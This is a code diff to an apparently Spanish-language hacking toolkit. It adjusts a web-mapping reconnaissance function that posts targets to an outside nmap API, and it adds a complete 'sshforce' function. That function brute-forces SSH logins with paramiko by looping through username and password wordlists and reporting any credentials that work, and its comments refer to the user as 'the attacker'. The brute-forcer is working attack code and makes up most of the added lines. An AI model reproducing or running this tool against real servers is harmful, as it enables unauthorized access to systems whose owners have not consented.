@@ -1,6 +1,7 @@
 import os
 import json
 
+# Verificacion de uso solamente en la carpeta instalada
 try:
     with open(".root", "r", encoding="utf-8") as root_dir:
         root_json = json.load(root_dir)
@@ -26,6 +27,7 @@ import codecs
 import random
 import base64
 import asyncio
+import paramiko
 import pyzipper
 import platform
 import requests
@@ -48,6 +50,8 @@ SYS_GLOBAL = platform.system().lower()
 if "termux" not in ROOT_MAX: # SI NO ES TERMUX
     import aspose.words as aw
 
+###################################################################
+#                    USOS GENERALES DEL PROGRAMA                  #
 ###################################################################
 
 def sht(path):   # Encargado de adaptar las rutas
@@ -141,6 +145,8 @@ def update():
     except Exception as err:
         crint(f"[ERROR] {err}")
 
+###################################################################
+#                   HERRAMIENTAS DEL PROGRAMA                     #
 ###################################################################
 
 def findperson(nombre, arg): # Funciona with
@@ -2268,6 +2274,7 @@ def webmap(url):
         "ports": ""
 
     }
+    
     try:
         # Enviamos la solicitud de mapeo al host
         post_nm = requests.post("https://hide.mn/api/nmap.php?out=js&post", data=nm_dat)
@@ -2317,17 +2324,19 @@ def webmap(url):
                     if url_rb not in results:
                         try:
                             results.append(url_rb)#.split("\n")[0])
-                        except Exception as err:
-                            print(err)
+                        except:
                             pass
+
         else:
             crint("[INFO] Obteniendo el mapeo del Sitio =>> [BAD]")
         
         # De todas formas se guarda el texto
         robot_ = get_bot.text
 
-    except Exception as err:
-        crint(f"[ERROR] {err}")
+    except:
+
+        robot_ = ""
+        crint("[INFO] Obteniendo el mapeo del Sitio =>> [BAD]")
         pass
 
     ##############################
@@ -2417,8 +2426,14 @@ def webmap(url):
             save_all(no_data, form_, ip_domain, domain_get, whois_pro, open_ports, results, dns_info, robot_)
             exit(0)
         
-        except Exception as err:
-            pass    
+        except:
+
+            if len(results) == 1:
+                crint("[ERROR] El servidor no respondio de la manera indicada ...")
+                save_all(no_data, form_, ip_domain, domain_get, whois_pro, open_ports, results, dns_info, robot_)
+                break
+            else:
+                pass
 
         # Reemplazamos :// para trabajar mejor
         url = url.replace("://", "3M3")
@@ -2489,5 +2504,90 @@ def webmap(url):
     save_all(no_data, form_, ip_domain, domain_get, whois_pro, open_ports, results, dns_info, robot_)
 
     # VERSION DE PHP Y SERVIDOR ETC 
+
+def sshforce(ip, port, usr, pssw):
+
+    filter_ = [ "/", "\\" ]
+
+    dir_list = os.listdir(".")
+    port = int(port)
+
+    # Ruta de usuarios y contraseñas comunes en assets
+    if usr == "df":
+        usr = ROOT_MAX + sht("assets/ssh_usr.txt")
+    
+    if pssw == "df":
+        pssw = ROOT_MAX + sht("assets/ssh_pssw.txt")
+
+    if ip == "" or port == "":
+        crint("[ERROR] No has rellenado los parametros correctamente ...")
+
+    else:
+        
+        if usr in dir_list:
+            usr = sht("./" + usr)
+        if pssw in dir_list:
+            pssw = sht("./" + pssw)
+        
+        cliente = paramiko.SSHClient()
+        cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        
+        # Si el atacante quiere testear muchos usuarios y contraseñas
+        if any(opt_ in usr for opt_ in filter_) and any(opt_p in pssw for opt_p in filter_):
+
+            with open(usr, "r", encoding="utf-8") as usr_path, open(pssw, "r", encoding="utf-8") as psww_path:
+
+                for user in usr_path:
+                    user = user.strip()
+                    psww_path.seek(0)
+
+                    for password in psww_path:
+                        password = password.strip()
+
+                        try:
+                            cliente.connect(ip, port, user, password)
+                        except:
+                            crint(f"[ERROR] Autenticacion fallida en =>> [{user}] [{password}]")
+                        else:
+                            crint(f"[PASS] Autenticacion correcta en =>> [{user}] [{password}]")
+                            cliente.close()
+                            exit(0)
+
+        # Si el atacante quiere testear una sola contraseña para muchos usuarios
+        elif "/" in usr or "\\" in usr:
+
+            with open(usr, "r", encoding="utf-8") as usr_path:
+
+                for user in usr_path:
+                    user = user.strip()
+
+                    try:
+                        cliente.connect(ip, port, user, pssw)
+                    except:
+                        crint(f"[ERROR] Autenticacion fallida en =>> [{user}] [{pssw}]")
+                    else:
+                        crint(f"[PASS] Autenticacion correcta en =>> [{user}] [{pssw}]")
+                        cliente.close()
+                        break
+
+        # Si el atacante quiere testear un solo usuario para muchas contraseñas
+        elif "/" in pssw or "\\" in pssw:
+
+            with open(pssw, "r", encoding="utf-8") as psww_path:
+
+                for password in psww_path:
+                    password = password.strip()
+
+                    try:
+                        cliente.connect(ip, port, usr, password)
+                    except:
+                        crint(f"[ERROR] Autenticacion fallida en =>> [{usr}] [{password}]")
+                    else:
+                        crint(f"[PASS] Autenticacion correcta en =>> [{usr}] [{password}]")
+                        cliente.close()
+                        break
+
+        else:
+            crint("[ERROR] Datos ingresados no validos ...")
 # python3 fsh.py urldump --a <social_network> --b <count> < ------------ in mgt0ls
 #################################
